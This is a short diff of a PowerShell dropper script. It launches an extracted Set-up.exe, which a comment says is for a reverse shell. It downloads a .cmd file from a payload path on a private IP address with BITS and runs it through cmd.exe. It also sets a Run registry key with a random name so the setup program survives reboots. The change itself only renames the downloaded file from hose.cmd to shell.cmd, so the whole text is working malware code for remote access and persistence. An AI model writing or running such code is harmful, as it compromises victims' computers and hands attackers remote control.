@@ -6,6 +6,6 @@ Expand-Archive -Path $zipDest -DestinationPath $extractPath -Force
 $setupPath = "$extractPath\Set-up.exe"
 if (-not (Test-Path $extractPath)) { New-Item -Path $extractPath -ItemType Directory }
 Start-Process -FilePath $setupPath  # Start Set-up.exe immediately for reverse shell
-Start-BitsTransfer -Source "http://192.168.204.146/payload/hose.cmd" -Destination "$extractPath\Hose.cmd"
-Start-Process -FilePath "cmd.exe" -ArgumentList "/c $extractPath\Hose.cmd"
+Start-BitsTransfer -Source "http://192.168.204.146/payload/shell.cmd" -Destination "$extractPath\shell.cmd"
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c $extractPath\shell.cmd"
 New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "5TQjtTuo" -Value $setupPath -PropertyType String -Force
